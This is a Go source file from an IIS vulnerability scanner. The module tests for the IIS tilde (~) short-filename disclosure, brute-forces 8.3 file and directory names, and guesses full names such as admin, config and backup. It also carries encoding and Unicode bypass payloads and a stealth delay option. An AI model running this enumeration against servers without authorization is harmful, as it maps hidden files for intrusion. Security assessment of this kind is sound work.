package modules

import (
	"fmt"
	"strings"
	"time"

	"github.com/ibrahmsql/iismap/internal/config"
	"github.com/ibrahmsql/iismap/pkg/http"
	"github.com/ibrahmsql/iismap/pkg/logger"
)

// TildeModule IIS Tilde (~) Character Vulnerability module
type TildeModule struct {
	*BaseModule
	config *config.Config
	logger *logger.Logger
}

// NewTildeModule creates new tilde module
func NewTildeModule(cfg *config.Config, log *logger.Logger) Module {
	return &TildeModule{
		BaseModule: NewBaseModule("tilde", "IIS Tilde (~) Character Vulnerability Scanner"),
		config:     cfg,
		logger:     log,
	}
}

// Run executes tilde module
func (t *TildeModule) Run(client *http.Client) (*ModuleResult, error) {
	t.Start()
	defer t.End()

	var vulnerabilities []Vulnerability
	var info []Information

	baseURL := t.config.GetBaseURL()

	// 1. Tilde vulnerability detection
	t.logger.Debug("Detecting tilde vulnerability...")
	if t.isTildeVulnerable(client, baseURL) {
		info = append(info, CreateInformation("tilde_vuln", "Tilde Vulnerability",
			"IIS Tilde (~) vulnerability detected", "VULNERABLE"))

		// 2. Short filename enumeration
		t.logger.Debug("Performing short filename enumeration...")
		filenames := t.enumerateShortFilenames(client, baseURL)
		for _, filename := range filenames {
			info = append(info, CreateInformation("short_filename", "Short Filename",
				"8.3 format filename detected", filename))
		}

		// 3. Directory enumeration
		t.logger.Debug("Performing directory enumeration...")
		directories := t.enumerateDirectories(client, baseURL)
		for _, dir := range directories {
			info = append(info, CreateInformation("short_directory", "Short Directory",
				"8.3 format directory name detected", dir))
		}

		// 4. Multiple encoding bypass
		t.logger.Debug("Testing multiple encoding bypass...")
		encodingVulns := t.testEncodingBypass(client, baseURL)
		vulnerabilities = append(vulnerabilities, encodingVulns...)

		// 5. Unicode normalization attacks
		t.logger.Debug("Testing Unicode normalization attacks...")
		unicodeVulns := t.testUnicodeNormalization(client, baseURL)
		vulnerabilities = append(vulnerabilities, unicodeVulns...)

		// Main vulnerability record
		vuln := CreateVulnerability(
			"IIS-TILDE-001",
			"IIS Tilde (~) Character Vulnerability",
			"IIS server has tilde (~) character vulnerability. This vulnerability allows enumeration of 8.3 format file/directory names.",
			"MEDIUM",
			5.3,
		)
		vuln.URL = baseURL
		vuln.Method = "GET"
		vuln.Evidence = "Tilde enumeration successful"
		vuln.Remediation = "Disable 8.3 filename creation in IIS"
		vuln.References = []string{
			"https://www.exploit-db.com/exploits/19525",
			"https://soroush.secproject.com/blog/2014/07/iis-short-file-name-disclosure-is-back-is-your-server-vulnerable/",
		}
		vulnerabilities = append(vulnerabilities, vuln)
	} else {
		info = append(info, CreateInformation("tilde_vuln", "Tilde Vulnerability",
			"IIS Tilde (~) vulnerability not detected", "NOT_VULNERABLE"))
	}

	return t.CreateResult("COMPLETED", vulnerabilities, info, nil), nil
}

// isTildeVulnerable checks for the presence of tilde vulnerability
func (t *TildeModule) isTildeVulnerable(client *http.Client, baseURL string) bool {
	// Test paths
	testPaths := []string{
		"/*~1*/",
		"/a*~1*/",
		"/*~1*/.aspx",
		"/*~1*/.asp",
		"/*~1*/a.aspx",
	}

	for _, path := range testPaths {
		resp, err := client.Get(baseURL + path)
		if err != nil {
			continue
		}
		t.IncrementRequests()

		// Responses other than 404 indicate vulnerability
		if resp.StatusCode != 404 {
			// Especially 400 Bad Request is a common indicator
			if resp.StatusCode == 400 || resp.StatusCode == 500 {
				return true
			}

			// Specific patterns in response body
			if strings.Contains(resp.Body, "The request filtering module is configured") ||
				strings.Contains(resp.Body, "Bad Request") ||
				strings.Contains(resp.Body, "Invalid URL") {
				return true
			}
		}
	}

	return false
}

// enumerateShortFilenames enumerates short filenames
func (t *TildeModule) enumerateShortFilenames(client *http.Client, baseURL string) []string {
	var filenames []string

	// Common file extensions
	extensions := []string{"asp", "aspx", "htm", "html", "txt", "xml", "config", "inc"}

	// Brute force with alphabet characters (limited in fast mode)
	maxChars := 'z'
	if t.config.Fast {
		maxChars = 'f' // Only a-f characters in fast mode
	}

	for _, ext := range extensions {
		for i := 'a'; i <= maxChars; i++ {
			for j := 'a'; j <= maxChars; j++ {
				shortName := fmt.Sprintf("/%c%c*~1*.%s", i, j, ext)

				resp, err := client.Get(baseURL + shortName)
				if err != nil {
					continue
				}
				t.IncrementRequests()

				// Successful response indicates presence of short filename
				if resp.StatusCode == 200 || resp.StatusCode == 403 || resp.StatusCode == 500 {
					filename := fmt.Sprintf("%c%c~1.%s", i, j, ext)
					filenames = append(filenames, filename)

					// Try to find full filename
					fullName := t.findFullFilename(client, baseURL, filename, ext)
					if fullName != "" {
						filenames = append(filenames, fullName)
					}
				}

				// Delay for rate limiting (only in stealth mode)
				if t.config.Stealth && t.config.Delay > 0 {
					time.Sleep(t.config.Delay / 20) // Very short delay
				}
			}
		}
	}

	return filenames
}

// enumerateDirectories enumerates short directory names
func (t *TildeModule) enumerateDirectories(client *http.Client, baseURL string) []string {
	var directories []string

	// Alfabe karakterleri ile brute force (fast modda sınırlı)
	maxChars := 'z'
	if t.config.Fast {
		maxChars = 'f' // Only a-f characters in fast mode
	}

	for i := 'a'; i <= maxChars; i++ {
		for j := 'a'; j <= maxChars; j++ {
			shortDir := fmt.Sprintf("/%c%c*~1*/", i, j)

			resp, err := client.Get(baseURL + shortDir)
			if err != nil {
				continue
			}
			t.IncrementRequests()

			// Successful response indicates presence of short directory name
			if resp.StatusCode == 200 || resp.StatusCode == 403 || resp.StatusCode == 500 {
				dirname := fmt.Sprintf("%c%c~1", i, j)
				directories = append(directories, dirname)

				// Try to find full directory name
				fullName := t.findFullDirectoryname(client, baseURL, dirname)
				if fullName != "" {
					directories = append(directories, fullName)
				}
			}
		}
	}

	return directories
}

// findFullFilename tries to find full filename from short filename
func (t *TildeModule) findFullFilename(client *http.Client, baseURL, shortName, ext string) string {
	// Common filename patterns
	commonNames := []string{
		"default", "index", "home", "main", "admin", "login", "config",
		"web", "site", "page", "test", "demo", "sample", "backup",
	}

	prefix := shortName[:2] // First two characters

	for _, name := range commonNames {
		if strings.HasPrefix(strings.ToLower(name), strings.ToLower(prefix)) {
			fullPath := fmt.Sprintf("/%s.%s", name, ext)

			resp, err := client.Head(baseURL + fullPath)
			if err != nil {
				continue
			}
			t.IncrementRequests()

			if resp.StatusCode == 200 {
				return name + "." + ext
			}
		}
	}

	return ""
}

// findFullDirectoryname tries to find full directory name from short directory name
func (t *TildeModule) findFullDirectoryname(client *http.Client, baseURL, shortName string) string {
	// Common directory name patterns
	commonDirs := []string{
		"admin", "administrator", "aspnet_client", "bin", "config", "content",
		"css", "data", "files", "images", "includes", "js", "scripts", "temp",
		"upload", "uploads", "user", "users", "web", "website",
	}

	prefix := shortName[:2] // First two characters

	for _, dir := range commonDirs {
		if strings.HasPrefix(strings.ToLower(dir), strings.ToLower(prefix)) {
			fullPath := fmt.Sprintf("/%s/", dir)

			resp, err := client.Get(baseURL + fullPath)
			if err != nil {
				continue
			}
			t.IncrementRequests()

			if resp.StatusCode == 200 || resp.StatusCode == 403 {
				return dir
			}
		}
	}

	return ""
}

// testEncodingBypass tests multiple encoding bypass techniques
func (t *TildeModule) testEncodingBypass(client *http.Client, baseURL string) []Vulnerability {
	var vulns []Vulnerability

	// Encoding bypass techniques
	encodings := []struct {
		name    string
		payload string
	}{
		{"Double URL Encoding", "/%252a%257e1%252a/"},
		{"Unicode Encoding", "/%u002a%u007e1%u002a/"},
		{"Mixed Encoding", "/*%7e1*/"},
		{"HTML Entity Encoding", "/&#42;&#126;1&#42;/"},
		{"UTF-8 Encoding", "/%c0%aa%c0%be1%c0%aa/"},
	}

	for _, encoding := range encodings {
		resp, err := client.Get(baseURL + encoding.payload)
		if err != nil {
			continue
		}
		t.IncrementRequests()

		if resp.StatusCode != 404 && resp.StatusCode != 400 {
			vuln := CreateVulnerability(
				"IIS-TILDE-002",
				"Tilde Enumeration Encoding Bypass",
				fmt.Sprintf("Tilde enumeration can be bypassed with %s", encoding.name),
				"MEDIUM",
				5.3,
			)
			vuln.URL = baseURL + encoding.payload
			vuln.Method = "GET"
			vuln.Payload = encoding.payload
			vuln.Evidence = fmt.Sprintf("Status: %d", resp.StatusCode)
			vuln.Remediation = "Strengthen input validation and encoding controls"
			vulns = append(vulns, vuln)
		}
	}

	return vulns
}

// testUnicodeNormalization tests unicode normalization attacks
func (t *TildeModule) testUnicodeNormalization(client *http.Client, baseURL string) []Vulnerability {
	var vulns []Vulnerability

	// Unicode normalization payloads
	unicodePayloads := []string{
		"/\u002a\u007e1\u002a/",      // Unicode asterisk and tilde
		"/\uff0a\uff5e1\uff0a/",      // Fullwidth characters
		"/\u2217\u223c1\u2217/",      // Mathematical symbols
		"/\u066d\u0653\u0031\u066d/", // Arabic characters
	}

	for _, payload := range unicodePayloads {
		resp, err := client.Get(baseURL + payload)
		if err != nil {
			continue
		}
		t.IncrementRequests()

		if resp.StatusCode != 404 && resp.StatusCode != 400 {
			vuln := CreateVulnerability(
				"IIS-TILDE-003",
				"Unicode Normalization Bypass",
				"Tilde enumeration can be bypassed with Unicode normalization",
				"MEDIUM",
				5.3,
			)
			vuln.URL = baseURL + payload
			vuln.Method = "GET"
			vuln.Payload = payload
			vuln.Evidence = fmt.Sprintf("Status: %d", resp.StatusCode)
			vuln.Remediation = "Implement Unicode normalization controls"
			vulns = append(vulns, vuln)
		}
	}

	return vulns
}
